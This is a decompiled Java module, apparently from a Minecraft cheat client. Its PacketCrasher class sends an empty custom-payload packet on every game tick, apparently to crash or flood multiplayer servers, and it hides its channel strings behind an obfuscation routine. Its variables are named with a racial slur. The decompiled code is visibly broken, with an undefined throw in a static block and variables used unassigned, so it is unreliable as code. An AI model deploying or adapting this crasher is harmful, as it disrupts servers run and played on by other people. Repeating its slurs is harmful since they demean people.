/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  io.netty.buffer.Unpooled
 */
package skizzle.modules.other;

import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import skizzle.events.Event;
import skizzle.events.listeners.EventUpdate;
import skizzle.modules.Module;

public class PacketCrasher
extends Module {
    public float premod;
    public Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void onEvent(Event Nigga) {
        if (Nigga instanceof EventUpdate && Nigga.isPre()) {
            PacketCrasher Nigga2;
            PacketBuffer Nigga3 = new PacketBuffer(Unpooled.buffer());
            Nigga2.mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload(Qprot0.0("\ua456\u71e8\u9f13\ue24f\ud030\u21c8\u8c28\uc838"), Nigga3));
        }
    }

    public static {
        throw throwable;
    }

    public PacketCrasher() {
        super(Qprot0.0("\ua44b\u71ca\u9f0c\ua7ef\u978d\u21d5\u8c0c\uc824\u5703\u3cd1\uabe4\uaf09\u26ff"), 0, Module.Category.OTHER);
        PacketCrasher Nigga;
        Nigga.premod = Nigga.mc.gameSettings.gammaSetting;
    }
}

